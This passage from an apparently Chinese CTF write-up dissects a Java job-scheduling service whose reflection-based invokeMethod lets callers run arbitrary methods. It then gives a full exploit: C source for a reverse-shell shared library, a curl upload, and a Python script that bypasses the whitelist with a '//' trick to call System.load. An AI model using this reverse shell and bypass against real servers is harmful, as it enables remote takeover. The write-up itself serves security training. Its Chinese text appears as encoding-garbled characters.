‡ä¸åœ¨ç™½åå•ä¸­&quot;</span>);<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            jobs.put(job.getJobName(), job);<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;ä»»åŠ¡æ·»åŠ æˆåŠŸ&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;jobId&quot;</span>, job.getJobName());<br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/job/run/&#123;jobName&#125;&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">runJob</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String jobName)</span> &#123;<br>        Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">ScheduledJob</span> <span class="hljs-variable">job</span> <span class="hljs-operator">=</span> (ScheduledJob)jobs.get(jobName);<br>        <span class="hljs-keyword">if</span> (job == <span class="hljs-literal">null</span>) &#123;<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;ä»»åŠ¡ä¸å­˜åœ¨&quot;</span>);<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-built_in">this</span>.invokeMethod(job.getInvokeTarget());<br>                result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>                result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;ä»»åŠ¡æ‰§è¡ŒæˆåŠŸ&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>                result.put(<span class="hljs-string">&quot;message&quot;</span>, e.getMessage());<br>                result.put(<span class="hljs-string">&quot;stackTrace&quot;</span>, e.getStackTrace()[<span class="hljs-number">0</span>].toString());<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsBlacklist</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">if</span> (str == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">lowerStr</span> <span class="hljs-operator">=</span> str.toLowerCase();<br><br>            <span class="hljs-keyword">for</span>(String blackItem : JOB_BLACKLIST) &#123;<br>                <span class="hljs-keyword">if</span> (lowerStr.contains(blackItem.toLowerCase())) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsWhitelist</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">if</span> (str == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">for</span>(String whiteItem : JOB_WHITELIST) &#123;<br>                <span class="hljs-keyword">if</span> (str.contains(whiteItem)) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(String invokeTarget)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">hashIndex</span> <span class="hljs-operator">=</span> invokeTarget.indexOf(<span class="hljs-number">35</span>);<br>        <span class="hljs-keyword">if</span> (hashIndex == -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid format, expected: className#methodName(params)&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> invokeTarget.substring(<span class="hljs-number">0</span>, hashIndex);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">methodAndParams</span> <span class="hljs-operator">=</span> invokeTarget.substring(hashIndex + <span class="hljs-number">1</span>);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">paramStart</span> <span class="hljs-operator">=</span> methodAndParams.indexOf(<span class="hljs-number">40</span>);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">paramEnd</span> <span class="hljs-operator">=</span> methodAndParams.lastIndexOf(<span class="hljs-number">41</span>);<br>            <span class="hljs-keyword">if</span> (paramStart != -<span class="hljs-number">1</span> &amp;&amp; paramEnd != -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> methodAndParams.substring(<span class="hljs-number">0</span>, paramStart);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">paramStr</span> <span class="hljs-operator">=</span> methodAndParams.substring(paramStart + <span class="hljs-number">1</span>, paramEnd);<br>                Class&lt;?&gt; clazz = Class.forName(className);<br>                List&lt;Object&gt; paramValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>                List&lt;Class&lt;?&gt;&gt; paramTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>                <span class="hljs-keyword">if</span> (!paramStr.trim().isEmpty()) &#123;<br>                    String[] params = <span class="hljs-built_in">this</span>.splitParams(paramStr);<br><br>                    <span class="hljs-keyword">for</span>(String param : params) &#123;<br>                        param = param.trim();<br>                        <span class="hljs-keyword">if</span> (param.startsWith(<span class="hljs-string">&quot;&#x27;&quot;</span>) &amp;&amp; param.endsWith(<span class="hljs-string">&quot;&#x27;&quot;</span>)) &#123;<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> param.substring(<span class="hljs-number">1</span>, param.length() - <span class="hljs-number">1</span>);<br>                            paramValues.add(value);<br>                            paramTypes.add(String.class);<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (param.equals(<span class="hljs-string">&quot;null&quot;</span>)) &#123;<br>                            paramValues.add((Object)<span class="hljs-literal">null</span>);<br>                            paramTypes.add(String.class);<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (param.matches(<span class="hljs-string">&quot;\\d+&quot;</span>)) &#123;<br>                            paramValues.add(Integer.parseInt(param));<br>                            paramTypes.add(Integer.TYPE);<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!param.equals(<span class="hljs-string">&quot;true&quot;</span>) &amp;&amp; !param.equals(<span class="hljs-string">&quot;false&quot;</span>)) &#123;<br>                            paramValues.add(param);<br>                            paramTypes.add(String.class);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            paramValues.add(Boolean.parseBoolean(param));<br>                            paramTypes.add(Boolean.TYPE);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(methodName, (Class[])paramTypes.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]));<br>                    <span class="hljs-keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;<br>                        <span class="hljs-keyword">return</span> method.invoke((Object)<span class="hljs-literal">null</span>, paramValues.toArray());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> clazz.newInstance();<br>                        <span class="hljs-keyword">return</span> method.invoke(instance, paramValues.toArray());<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var18) &#123;<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(methodName, (Class[])paramTypes.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]));<br>                    method.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;<br>                        <span class="hljs-keyword">return</span> method.invoke((Object)<span class="hljs-literal">null</span>, paramValues.toArray());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> clazz.newInstance();<br>                        <span class="hljs-keyword">return</span> method.invoke(instance, paramValues.toArray());<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid method format&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String[] splitParams(String paramStr) &#123;<br>        List&lt;String&gt; params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">bracketLevel</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; paramStr.length(); ++i) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> paramStr.charAt(i);<br>            <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;&#123;&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;&#125;&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;,&#x27;</span> &amp;&amp; bracketLevel == <span class="hljs-number">0</span>) &#123;<br>                        params.add(paramStr.substring(start, i));<br>                        start = i + <span class="hljs-number">1</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    --bracketLevel;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ++bracketLevel;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (start &lt; paramStr.length()) &#123;<br>            params.add(paramStr.substring(start));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> (String[])params.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScheduledJob</span> &#123;<br>        <span class="hljs-keyword">private</span> String jobName;<br>        <span class="hljs-keyword">private</span> String invokeTarget;<br>        <span class="hljs-keyword">private</span> String cronExpression;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getJobName</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.jobName;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setJobName</span><span class="hljs-params">(String jobName)</span> &#123;<br>            <span class="hljs-built_in">this</span>.jobName = jobName;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInvokeTarget</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.invokeTarget;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setInvokeTarget</span><span class="hljs-params">(String invokeTarget)</span> &#123;<br>            <span class="hljs-built_in">this</span>.invokeTarget = invokeTarget;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCronExpression</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.cronExpression;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCronExpression</span><span class="hljs-params">(String cronExpression)</span> &#123;<br>            <span class="hljs-built_in">this</span>.cronExpression = cronExpression;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»™äº†æ–‡ä»¶ä¸Šä¼ çš„è·¯ç”±ï¼Œä¹Ÿç»™äº†å°†ä¼ å…¥çš„æ–‡ä»¶è½¬æ¢ä¸ºjobçš„addè·¯ç”±ï¼Œå…¶æ¬¡æ˜¯runè¿™ä¸ªjobçš„è·¯ç”±ï¼Œä¹Ÿæ˜¯æ¶æ„ç‚¹ä½ã€‚</p><p>è¿™ä¸ª<code>/job/run/</code>è°ƒç”¨çš„è¿˜æ˜¯å®ƒè‡ªå·±å†™çš„<code>invokeMethod()</code>ï¼Œå®ƒä½¿ç”¨ Java Reflectionæ¥åŠ¨æ€åœ°è°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>ã€è§£æè¾“å…¥å­—ç¬¦ä¸²ï¼šå®ƒæ¥æ”¶ä¸€ä¸ªæ ¼å¼ä¸º className#methodName(param1,param2,...) çš„å­—ç¬¦ä¸² invokeTargetã€‚<br><span class="hljs-number">2</span>ã€åŠ è½½ç±»ï¼šå®ƒæ ¹æ®å­—ç¬¦ä¸²ä¸­çš„ className éƒ¨åˆ†ï¼Œä½¿ç”¨ Class.forName(className) æ¥åŠ è½½å¯¹åº”çš„ç±»ã€‚<br><span class="hljs-number">3</span>ã€è§£ææ–¹æ³•å’Œå‚æ•°ï¼šå®ƒä»å­—ç¬¦ä¸²ä¸­æå–å‡ºæ–¹æ³•åå’Œå‚æ•°ã€‚å®ƒä¼šå°è¯•è§£æå‚æ•°çš„ç±»å‹ï¼Œæ”¯æŒå­—ç¬¦ä¸²ï¼ˆç”¨å•å¼•å·åŒ…è£¹ï¼‰ã€æ•´æ•°ã€å¸ƒå°”å€¼å’Œ <span class="hljs-literal">null</span>ã€‚<br><span class="hljs-number">4</span>ã€è·å–æ–¹æ³•å¯¹è±¡ï¼šå®ƒä½¿ç”¨åå°„åœ¨åŠ è½½çš„ç±»ä¸­æŸ¥æ‰¾ä¸æ–¹æ³•åå’Œå‚æ•°ç±»å‹åŒ¹é…çš„æ–¹æ³•ã€‚å®ƒé¦–å…ˆå°è¯•æŸ¥æ‰¾å…¬å…±æ–¹æ³• (getMethod)ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œä¼šç»§ç»­å°è¯•æŸ¥æ‰¾ç§æœ‰æ–¹æ³• (getDeclaredMethod) å¹¶è®¾ç½®å…¶ä¸ºå¯è®¿é—® (setAccessible(<span class="hljs-literal">true</span>))ã€‚<br><span class="hljs-number">5</span>ã€åˆ›å»ºå®ä¾‹å¹¶è°ƒç”¨ï¼š<br>å¦‚æœæ–¹æ³•æ˜¯é™æ€çš„ (<span class="hljs-keyword">static</span>)ï¼Œå®ƒä¼šç›´æ¥è°ƒç”¨ã€‚<br>å¦‚æœæ–¹æ³•æ˜¯å®ä¾‹æ–¹æ³•ï¼Œå®ƒä¼šå…ˆé€šè¿‡ clazz.newInstance() åˆ›å»ºè¯¥ç±»çš„ä¸€ä¸ªæ–°å®ä¾‹ï¼ˆè°ƒç”¨æ— å‚æ„é€ å‡½æ•°ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å®ä¾‹çš„æ–¹æ³•ã€‚<br><span class="hljs-number">6</span>ã€è¿”å›ç»“æœï¼šå®ƒè¿”å›è¢«è°ƒç”¨æ–¹æ³•çš„æ‰§è¡Œç»“æœã€‚<br></code></pre></td></tr></table></figure><p>æ€»ä¹‹ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ä¸ªæ–¹æ³•å…è®¸ç¨‹åºæ ¹æ®ä¸€ä¸ªå­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ç±»çš„ä»»æ„ï¼ˆåŒ…æ‹¬ç§æœ‰çš„ï¼‰æ–¹æ³•ã€‚</p><p>è¿™é‡Œæ€è·¯å°±æœ‰äº†ï¼Œå°±æ˜¯ä¸Šä¼ ä¸€ä¸ªä¸œè¥¿ï¼Œç„¶åæŠŠå®ƒæ·»åŠ åˆ°ä¸€ä¸ªjobé‡Œï¼Œè¿™ä¸ªä¸œè¥¿é‡Œé¢å«æœ‰æŸç§æ¶æ„ä»£ç ï¼Œç„¶åè®©è¿™ä¸ª&#x2F;job&#x2F;runæ¥è§¦å‘å®ƒã€‚</p><p>å…¶å®å°±æ˜¯ä¸€ä¸ªå°trickï¼Œå¾ˆè‡ªç„¶èƒ½æƒ³åˆ°**<code>ä¸Šä¼ ä¸€ä¸ªæ¶æ„soæ–‡ä»¶(å¯åå¼¹shell)</code>ï¼Œç„¶åè°ƒç”¨<code>java.lang.System#load//loadLibrary</code>æ¥è§¦å‘åŠ è½½å®ƒ**ã€‚</p><p>è¿™ä¹Ÿæ˜¯åŠ è½½æœ¬åœ°åº“ï¼ˆNative Librariesï¼‰ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨Javaçš„JNIï¼ˆJava Native Interfaceï¼‰æœºåˆ¶çš„å¸¸ç”¨æ–¹æ³•ï¼Œç»•RASPç”¨çš„ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œæœ€å¥½éœ€è¦æŒ‡å®šæ¶æ„soæ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼Œå¦‚æœç”¨loadLibraryè™½è¯´å¯ä»¥ä¸ç”¨åŠ ä»€ä¹ˆåç¼€ï¼Œä½†åŠ è½½çš„æ–‡ä»¶å¿…é¡»åœ¨è®¾ç½®çš„<code>java.library.path</code>é‡Œï¼Œä½†æ˜¯æˆ‘ä»¬å¥½åƒä¸çŸ¥é“è¿™ç©æ„ï¼Œé¢˜ç›®åªå‘Šè¯‰æˆ‘ä»¬ä¸Šä¼ è·¯å¾„åœ¨&#x2F;tmp&#x2F;uploadsã€‚æ‰€ä»¥åªèƒ½ç”¨loadã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ä¹‹åå°±æ˜¯å†™ä¸€ä¸ªåå¼¹shellçš„cä»£ç ï¼Œgccç¼–è¯‘æˆsoï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-comment">// ä½¿ç”¨ __attribute__((constructor)) ç¡®ä¿åœ¨åº“åŠ è½½æ—¶è‡ªåŠ¨æ‰§è¡Œæ­¤å‡½æ•°</span><br>__attribute__((constructor))<br><span class="hljs-type">void</span> <span class="hljs-title function_">revshell</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* ip = <span class="hljs-string">&quot;vps&quot;</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> port = <span class="hljs-number">1234</span>;<br>    <span class="hljs-comment">// --------------------------------</span><br><br>    <span class="hljs-type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (sock &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server_addr</span>;</span><br>    server_addr.sin_family = AF_INET;<br>    server_addr.sin_port = htons(port);<br>    server_addr.sin_addr.s_addr = inet_addr(ip);<br><br>    <span class="hljs-keyword">if</span> (connect(sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;server_addr, <span class="hljs-keyword">sizeof</span>(server_addr)) != <span class="hljs-number">0</span>) &#123;<br>        close(sock);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// é‡å®šå‘æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯åˆ°socket</span><br>    dup2(sock, <span class="hljs-number">0</span>); <span class="hljs-comment">// stdin</span><br>    dup2(sock, <span class="hljs-number">1</span>); <span class="hljs-comment">// stdout</span><br>    dup2(sock, <span class="hljs-number">2</span>); <span class="hljs-comment">// stderr</span><br><br>    <span class="hljs-comment">// æ‰§è¡Œä¸€ä¸ªshell</span><br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    close(sock);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC revshell.c -o revshell.so<br></code></pre></td></tr></table></figure><p>å…ˆcurlä¸Šä¼ ä¸€ä¸‹æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -F <span class="hljs-string">&quot;file=@revshell.so&quot;</span> http://pss.idss-cn.com:24480/api/upload<br></code></pre></td></tr></table></figure><p><img src="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/image-20250822010953192.png" alt="image-20250822010953192"></p><p>ç„¶åå†™ä¸ªè„šæœ¬ç›´æ¥æ‰“ã€‚</p><p>æœ€åæ³¨æ„ä¸€ä¸‹ç»•è¿‡æ¡ä»¶ï¼Œä½†æ˜¯åŠ ä¸ª<code>//</code>å†æŠŠFLAGç±»ååŠ åé¢å°±èƒ½éšä¾¿ç»•äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_and_run_job</span>(<span class="hljs-params">base_url</span>):<br>    job_name = <span class="hljs-string">&quot;revshell&quot;</span><br>    <span class="hljs-comment"># so_path = &quot;/tmp/uploads/revshell.so&quot;</span><br>    invoke_target = <span class="hljs-string">&quot;java.lang.System#load(&#x27;/tmp/uploads/revshell.so&#x27;) // com.jabaez.FLAG&quot;</span><br><br>    <span class="hljs-comment"># --- 1. æ·»åŠ ä»»åŠ¡ ---</span><br>    add_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base_url&#125;</span>/api/job/add&quot;</span><br>    add_payload = &#123;<br>        <span class="hljs-string">&quot;jobName&quot;</span>: job_name,<br>        <span class="hljs-string">&quot;invokeTarget&quot;</span>: invoke_target<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        add_response = requests.post(add_url, json=add_payload, timeout=<span class="hljs-number">5</span>)<br>        add_response.raise_for_status()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] ä»»åŠ¡æ·»åŠ æˆåŠŸ: <span class="hljs-subst">&#123;add_response.json()&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] æ·»åŠ ä»»åŠ¡å¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># --- 2. è¿è¡Œä»»åŠ¡ ---</span><br>    run_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base_url&#125;</span>/api/job/run/<span class="hljs-subst">&#123;job_name&#125;</span>&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[*] æ­£åœ¨è¿è¡Œä»»åŠ¡: <span class="hljs-subst">&#123;job_name&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># è¿è¡Œä»»åŠ¡ä¼šè§¦å‘åå¼¹shellï¼Œè¯·æ±‚å¯èƒ½ä¼šè¶…æ—¶ï¼Œè¿™æ˜¯æ­£å¸¸çš„</span><br>        run_response = requests.post(run_url, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] ä»»åŠ¡æ‰§è¡Œè¯·æ±‚å·²å‘é€ã€‚æœåŠ¡å™¨å“åº”: <span class="hljs-subst">&#123;run_response.text&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] è¯·æ±‚è¶…æ—¶ã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºåå‘shellå·²æˆåŠŸå»ºç«‹ã€‚è¯·æ£€æŸ¥æ‚¨çš„ç›‘å¬å™¨ã€‚&quot;</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] è¿è¡Œä»»åŠ¡æ—¶å‡ºé”™: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    target_url = <span class="hljs-string">&quot;http://pss.idss-cn.com:24480&quot;</span><br>    add_and_run_job(target_url)<br></code></pre></td></tr></table></figure><p><img 